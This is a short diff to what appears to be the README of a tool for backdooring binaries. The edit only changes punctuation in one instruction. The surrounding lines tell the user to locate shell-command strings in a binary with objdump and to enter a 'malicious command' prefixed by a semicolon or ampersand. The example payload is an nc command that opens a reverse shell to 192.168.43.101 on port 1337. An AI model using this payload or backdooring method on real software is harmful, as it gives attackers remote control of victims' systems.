@@ -18,7 +18,7 @@ In that input field enter the shell command that the binary you want to backdoor
 ```bash
 objdump -s -j .rodata binary_name
 ```
-Next the program will ask you to enter the malicious command . Make sure you add ;or& before your command.
+Next the program will ask you to enter the malicious command . Make sure you add "; or &" before your command.
 ```bash
 ;nc 192.168.43.101 1337 -e /bin/bash
 ```
